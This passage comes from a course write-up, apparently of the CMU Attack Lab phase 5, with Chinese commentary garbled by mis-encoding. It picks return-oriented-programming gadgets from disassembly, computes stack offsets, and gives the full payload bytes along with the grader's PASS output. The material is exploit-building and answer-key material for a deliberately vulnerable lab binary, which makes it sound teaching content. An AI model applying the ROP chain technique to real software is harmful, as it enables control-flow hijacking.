    401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
    401a09:	c3                   	retq 
  
  00000000004019c3 <setval_426>:
    4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
    4019c9:	c3 
  ```

  å¯æˆªå–å‡º`48 89 e0`å’Œ`48 89 c7`ï¼Œå¯¹åº”åœ°å€ä¸º`401a06`å’Œ`4019c5`

- åç§»é‡ï¼ˆæš‚å®šä¸ºxï¼‰ => `%rax`

  ```assembly
  00000000004019a7 <addval_219>:
    4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
    4019ad:	c3  
  ```

  æˆªå–`58 90 c3`ä¸º`popq %rax,ret`ï¼Œåœ°å€ä¸º`4019ab`

  æ¥ä¸‹æ¥çš„8å­—èŠ‚å­˜æ”¾æˆ‘ä»¬çš„åç§»é‡ï¼Œè¢«popè¿›å…¥`%rax`

- `%eax` => `%edx` => `%ecx` => `%esi`

  ~~ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆå¤æ‚ï¼Œå› ä¸ºgadgetå¾ˆéš¾æˆªå–å•Šqwq~~

  ```assembly
  0000000000401a40 <addval_487>:
    401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
    401a46:	c3
    
  0000000000401a33 <getval_159>:
    401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
    401a38:	c3 
  
  0000000000401a25 <addval_187>:
    401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
    401a2b:	c3  
  ```

  è¿™ä¸‰æ®µåˆ†åˆ«å¯¹åº”ä¸‰æ­¥ï¼Œ`89 c2`ï¼Œ`401a42`ï¼›`89 d1`ï¼Œ`401a34`ï¼›`89 ce`ï¼Œ`401a27`

- æ‰§è¡Œ`lea`æŒ‡ä»¤å¾—å‡ºåœ°å€ï¼Œåœ°å€ä¸º`4019d6`

- å°†åœ°å€ä»`%rax`è½¬å…¥`%rdi`

  ```assembly
  00000000004019c3 <setval_426>:
    4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
    4019c9:	c3 
  ```

  `48 89 c7`å¯¹åº”åœ°å€`4019c5`

- è°ƒç”¨`touch3`ï¼Œåœ°å€ä¸º`4018fa`

- è®¡ç®—åç§»é‡ï¼Œå‰é¢å…±æœ‰9æ¡åœ°å€åŠ ä¸€ä¸ªåç§»é‡ï¼Œç›¸å¯¹äºbufæ•°ç»„å¤šå 80å­—èŠ‚ã€‚ç”±äº`%rsp`æŒ‡å‘bufå¤§8å­—èŠ‚çš„ä½ç½®ï¼ˆä¹‹å‰å‚¨å­˜è¿”å›testå‡½æ•°çš„åœ°å€çš„8å­—èŠ‚ï¼‰ï¼Œæ‰€ä»¥åç§»é‡ä¸º72=0x48ï¼Œåœ¨è¿™é‡Œåé¢çš„8å­—èŠ‚å­˜æ”¾cookieã€‚

ç»„è£…èµ·æ¥ï¼š

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00  <-- movq %rsp, %rax
c5 19 40 00 00 00 00 00  <-- movq %rax, %rdi
ab 19 40 00 00 00 00 00  <-- popq %rax
48 00 00 00 00 00 00 00  <-- åç§»é‡
42 1a 40 00 00 00 00 00  <-- movl %eax, %edx
34 1a 40 00 00 00 00 00  <-- movl %edx, %ecx
27 1a 40 00 00 00 00 00  <-- movl %ecx, %esi
d6 19 40 00 00 00 00 00  <-- lea  (%rdi,%rsi,1),%rax
c5 19 40 00 00 00 00 00  <-- movq %rax, %rdi
fa 18 40 00 00 00 00 00  <-- touch3
35 39 62 39 39 37 66 61  <-- cookie å€¼
```

ç»“æœï¼š

```bash
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 42 1A 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 27 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
```

